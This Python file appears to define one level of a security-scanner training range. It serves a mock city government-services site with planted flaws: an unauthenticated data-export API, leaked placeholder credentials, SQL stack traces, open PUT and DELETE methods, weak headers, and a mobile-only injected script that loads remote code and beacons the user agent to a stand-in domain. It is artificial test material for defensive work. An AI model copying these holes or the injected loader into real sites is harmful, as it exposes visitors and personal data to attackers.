# -*- coding: utf-8 -*-
r"""
L4 · 逻辑门　　难度 ★★★★☆
==================================================================

【设计意图】
前三关的线索都在"看到的东西"里（页面、文件、JS）。
这一关的线索在**"请求怎么发"**里 —— 同一批数据，
用不同的请求方式去要，结果完全不一样。

这模拟的是真实系统里最常见也最难自动化的场景：

    · 后台导出接口要一堆参数凑对了才吐数据
    · 附件下载要校验来源（Referer）
    · 错误参数才会回显堆栈（正常参数反而什么都看不到）
    · 恶意代码只对特定客户端（手机）下发，桌面浏览器看不到
    · PUT/DELETE 这类危险方法开着，但没人去试

对检测系统的要求从"会爬"升级成"会构造请求、会试参数、会换身份"。

【本关种入的问题】
  分类        问题                                     位置 / 触发条件
  ──────────  ─────────────────────────────────────  ────────────────────────────
  敏感信息    全量人员表（身份证+银行卡+口令）           GET /l4/api/v1/export
                                                        ?format=json&scope=all&debug=1
  敏感信息    内部通知含云平台密钥                      GET /l4/notice.html?id=2024-001
  敏感信息    附件里的人员名单                          GET /l4/download/roster-2024.csv
                                                        需 Referer 为本站
  漏洞        报错信息泄漏（堆栈+SQL 语句+绝对路径）     GET /l4/notice.html?id=abc
  漏洞        危险 HTTP 方法开放（PUT/DELETE）           /l4/upload/
  漏洞        API 无鉴权，仅靠参数"隐蔽"                /l4/api/v1/export
  漏洞        组件版本过旧（Bootstrap 3.3.7）             /l4/js/vendor/bootstrap.min.js
  弱配置      安全响应头**只在首页**设置                对比 /l4/ 与 /l4/notice.html
  挂马        仅对移动端 UA 注入（桌面端看不到）         /l4/ 首页（UA 含 Mobile/Android）
  篡改        HTTPS 被降级为 HTTP（等价替换）            /l4/ 首页的制度链接
  篡改        联系电话被改 1 位，且与公告页不一致         /l4/ 首页 vs /l4/notice.html

【检测难度】
 · 需要主动构造带参数/带请求头/换 UA 的请求
 · 敏感数据"不请求就看不见"，被动爬取一定漏
 · 安全头只挂首页 → 只测根 URL 的工具会误判为"配置良好"
==================================================================
"""

import json

from rangekit import FAKE, PEOPLE, box, esc, page, table

# 移动端才注入的挂马片段（桌面 UA 完全看不到这段）
_MOBILE_ONLY_PAYLOAD = """
<script>
/* 移动端阅读优化 */
(function(){
  var el = document.createElement('script');
  el.src = '//mcdn.example-adpump-cn.com/m/stat.js?site=zwfw';
  el.async = true;
  document.head.appendChild(el);
  try { new Image().src = '//mcdn.example-adpump-cn.com/m/1x1.gif?v=' +
        encodeURIComponent(navigator.userAgent); } catch(e){}
})();
</script>
"""


def _reply(body, ctype="text/html; charset=utf-8", status=200, headers=None, note=""):
    from serve import Reply
    return Reply(status, body, content_type=ctype, headers=headers or {}, note=note)


# ==================================================================
# 首页：唯一设了安全响应头的页面（这就是陷阱）
# ==================================================================
_INDEX_HEADERS = {
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Content-Security-Policy": "default-src 'self'",
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "strict-origin-when-cross-origin",
}


def page_index(ctx, m):
    body = """
<!-- 内部维护提示：
     数据导出接口 /l4/api/v1/export （需带 debug 参数，详见接口文档）
     附件目录     /l4/download/
     上传接口     /l4/upload/  （支持 PUT）
-->

<h2>欢迎访问</h2>
<p>本站已启用全站安全响应头防护。</p>

<h2>办事服务</h2>
<ul>
  <li><a href="#">企业开办一网通办</a></li>
  <li><a href="#">社会保障卡业务</a></li>
  <li><a href="notice.html?id=2024-001">2024 年第一季度工作通报</a></li>
</ul>

<h2>制度文件</h2>
<ul>
  <li><a href="http://www.example-zwfw-cn.com/policy/2024.html">政务服务管理办法（2024 修订）</a></li>
  <li><a href="tools/page.php?p=about">办事指南与机构介绍</a></li>
  <li><a href="tools/page.php?p=contact">联系方式</a></li>
  <li><a href="notice.html?id=2024-002">值班制度说明</a></li>
</ul>

<p>咨询电话：0571-8721-3388</p>
"""
    if ctx.is_mobile_ua():
        body += _MOBILE_ONLY_PAYLOAD
    return _reply(page("某某市政务服务网", body), headers=dict(_INDEX_HEADERS))


# ==================================================================
# 详情页：正常参数正常返回；错误参数回显堆栈
# ==================================================================
def page_notice(ctx, m):
    """
    id 是数字 → 正常内容。
    id 不是数字 → 回显一段"真实感"很强的 Python 堆栈（含 SQL 与绝对路径）。

    这个设计的意义：**报错信息泄漏往往需要"故意制造错误"才能触发**，
    顺手抓一遍页面是发现不了的。
    """
    raw_id = ctx.q("id", "2024-001")

    # 触发器：非数字 id
    if raw_id and not raw_id.replace("-", "").isdigit():
        stack = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>500 Internal Server Error</title></head>
<body>
<h1>Internal Server Error</h1>
<h2>Traceback (most recent call last):</h2>
<pre>
  File "/opt/zwfw/app/wsgi.py", line 33, in __call__
    return self.app(environ, start_response)
  File "/opt/zwfw/app/views/notice.py", line 42, in detail
    row = db.query(f"SELECT * FROM zwfw_notice WHERE id={{notice_id}}")
  File "/opt/zwfw/app/lib/db.py", line 118, in query
    cur.execute(sql)
  File "/opt/zwfw/venv/lib/python3.8/site-packages/pymysql/cursors.py", line 170, in execute
    result = self._query(query)
  File "/opt/zwfw/venv/lib/python3.8/site-packages/pymysql/connections.py", line 564, in query
    conn.query(q)
</pre>
<h2>pymysql.err.ProgrammingError</h2>
<pre>(1064, "You have an error in your SQL syntax; check the manual that corresponds to
your MySQL server version for the right syntax to use near '{esc(raw_id)}' at line 1")</pre>
<hr>
<address>Werkzeug/2.0.3 Python/3.8.10 &nbsp; Server at zwfw-app-01.internal (10.12.34.51) Port 8000</address>
</body></html>
"""
        return _reply(stack, status=500)

    # 特定 id → 内部通知（含云密钥）
    if raw_id == "2024-001":
        body = f"""
<h2>2024 年第一季度工作通报</h2>
<p class="meta">内部资料　请勿外传</p>
<p>本季度共受理政务服务事项 12,847 件，按期办结率 99.2%。</p>

<h3>信息化建设进展</h3>
<p>我中心已完成政务云平台对接，相关凭据由运维组统一保管：</p>
<ul>
  <li>云平台 AccessKey：{FAKE["api_key"]}</li>
  <li>云平台 Secret：{FAKE["api_secret"]}</li>
  <li>接口调用凭证：JWT（有效期 365 天，未启用轮换）</li>
</ul>
<p>数据库主库地址：{FAKE["db_ip"]}:3306　应用账号：{FAKE["db_user"]}</p>
<p>内网运维入口：{FAKE["oa_url"]}</p>
"""
        return _reply(page("2024 年第一季度工作通报", body))

    body = f"""
<h2>通知详情（id={esc(raw_id)}）</h2>
<p>本季度值班安排已发布，请各部门及时查阅。</p>
<p>咨询电话：0571-8721-3396</p>
"""
    return _reply(page("通知详情", body))


# ==================================================================
# 导出接口：参数凑对了才吐数据
# ==================================================================
def api_export(ctx, m):
    """
    一个"没有鉴权、只靠参数隐蔽"的导出接口。

    参数对了  → 返回全量人员数据（含身份证、银行卡、账号口令）
    参数不对  → 403，且提示信息刻意含糊

    真实世界里这类接口非常常见：开发时为了方便调试留的，
    上线时忘了删，路径又不在菜单里，只能靠猜。
    """
    have_format = ctx.q("format", "") == "json"
    have_scope = ctx.q("scope", "") == "all"
    have_debug = ctx.q("debug", "") == "1"

    if not (have_format and have_scope and have_debug):
        missing = []
        if not have_format:
            missing.append("format=json")
        if not have_scope:
            missing.append("scope=all")
        if not have_debug:
            missing.append("debug=1")
        return _reply(json.dumps({
            "code": 403,
            "msg": "参数不完整，接口拒绝访问",
            "hint": "需要 ?format=json&scope=all&debug=1",
        }, ensure_ascii=False), "application/json; charset=utf-8", status=403)

    records = []
    for iid, name, phone, dept, staff in PEOPLE:
        records.append({
            "id_card": iid,
            "name": name.replace(" ", ""),
            "phone": phone,
            "dept": dept,
            "staff_no": staff,
            "bank_account": FAKE["bank_1"] if staff == "GW100237" else FAKE["bank_2"],
            "email": FAKE["mail_1"],
            "db_user": FAKE["db_user"],
            "db_pass": FAKE["db_pass"],
        })
    payload = json.dumps({
        "code": 0,
        "total": len(records),
        "generated_at": "2024-03-12T09:31:00+08:00",
        "data": records,
    }, ensure_ascii=False, indent=2)
    from serve import Reply
    return Reply(200, payload, content_type="application/json; charset=utf-8",
                 note="api-unauth-export")


# ==================================================================
# 附件下载：必须带本站 Referer
# ==================================================================
def page_download(ctx, m):
    """
    Referer 校验 —— 一个"看起来像防护、其实是纸糊的"设计。
    真实场景：很多系统的防盗链只检查 Referer 里有没有自己的域名，
    而这个头是**客户端可以随便伪造的**。
    """
    ref = ctx.header("referer")
    if "/l4/" not in ref:
        return _reply(page("403 - 访问受限", """
<div class="box danger">
  <h3>403 Forbidden</h3>
  <p>附件请从站内页面点击下载。请勿直接访问本目录。</p>
</div>
"""), status=403)

    if ctx.path.rstrip("/").endswith("roster-2024.csv"):
        rows = [(iid, name, phone, dept) for iid, name, phone, dept, _s in PEOPLE]
        csv = "身份证号,姓名,联系电话,所属科室\n"
        csv += "\n".join(",".join(r) for r in rows)
        from serve import Reply
        return Reply(200, csv, content_type="text/csv; charset=utf-8",
                     note="referer-gated-roster")

    body = f"""
<h2>资料下载</h2>
<ul>
  <li><a href="download/roster-2024.csv">全市政务人员名单（2024）</a></li>
  <li><a href="download/policy.pdf">政务服务管理办法</a></li>
</ul>
"""
    return _reply(page("资料下载", body))


# ==================================================================
# 危险方法开放
# ==================================================================
def upload_put(ctx, m):
    """PUT 方法开放 —— 允许向服务器写入文件。"""
    return _reply("""{"code":0,"msg":"upload accepted","path":"/l4/upload/tmp"}""",
                  "application/json; charset=utf-8", status=201,
                  note="dangerous-method-put")


def upload_delete(ctx, m):
    return _reply('{"code":0,"msg":"deleted"}', "application/json; charset=utf-8",
                  status=200, note="dangerous-method-delete")


def upload_options(ctx, m):
    """
    OPTIONS 是**只读**的方法列表查询，不会修改任何东西 ——
    巡检场景下这是探测"危险方法是否开放"的合规做法。
    """
    from serve import Reply
    return Reply(200, "", content_type="text/plain",
                 headers={"Allow": "GET, HEAD, POST, PUT, DELETE, OPTIONS"},
                 note="options-allow")


def bootstrap_337(ctx, m):
    css = """/*!
 * Bootstrap v3.3.7 (http://getbootstrap.com)
 * Copyright 2011-2016 Twitter, Inc.
 */
.container{width:1170px;margin-right:auto;margin-left:auto}
.row{margin-right:-15px;margin-left:-15px}
"""
    return _reply(css, "text/css; charset=utf-8")


def robots(ctx, m):
    text = """User-agent: *
Disallow: /l4/api/
Disallow: /l4/upload/
Disallow: /l4/download/

Sitemap: /l4/sitemap.xml
"""
    return _reply(text, "text/plain; charset=utf-8")


def sitemap(ctx, m):
    """入口线索藏在 sitemap 里 —— 首页没有指向 api/download 的链接。"""
    host = ctx.header("host")
    paths = ["", "index.html", "notice.html?id=2024-001", "notice.html?id=2024-002",
             "download/", "api/v1/export"]
    urls = "\n".join(f'  <url><loc>http://{host}/l4/{p}</loc></url>' for p in paths)
    return _reply(f"""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
{urls}
</urlset>
""", "application/xml; charset=utf-8")


ROUTES = (
    ("*", r"^/$", page_index),
    ("*", r"^/index\.html$", page_index),
    ("*", r"^/notice\.html$", page_notice),
    ("*", r"^/download/?$", page_download),
    ("*", r"^/download/roster-2024\.csv$", page_download),
    ("*", r"^/download/(policy|other)\.pdf$", page_download),
    ("*", r"^/api/v1/export$", api_export),
    ("PUT", r"^/upload/?$", upload_put),
    ("DELETE", r"^/upload/(.*)$", upload_delete),
    ("OPTIONS", r"^/upload/?$", upload_options),
    ("*", r"^/js/vendor/bootstrap\.min\.css$", bootstrap_337),
    ("*", r"^/robots\.txt$", robots),
    ("*", r"^/sitemap\.xml$", sitemap),
)

LEVEL = {
    "id": 4,
    "key": "l4",
    "name": "逻辑门",
    "difficulty": "★★★★☆",
    "summary": "线索不在页面上而在请求里：要凑参数、带 Referer、换 UA、试方法。",
    "hints": "拿到一个 URL 别只 GET 一次。试试改参数、换 UA、加请求头、用 PUT/OPTIONS。",
    "tags": ["敏感信息", "挂马", "篡改", "弱配置", "漏洞"],
    "banner": "Werkzeug/2.0.3 Python/3.8.10",
    # 注意：这里**故意留空** —— 安全头只在首页通过路由单独设置，
    # 子页面一个都没有。只测根 URL 的工具会得出"配置良好"的错误结论。
    "headers": {},
    "autoindex": False,
    "methods": ("GET", "HEAD", "OPTIONS", "POST", "PUT", "DELETE"),
    "assets": "l4",
    "routes": ROUTES,
}
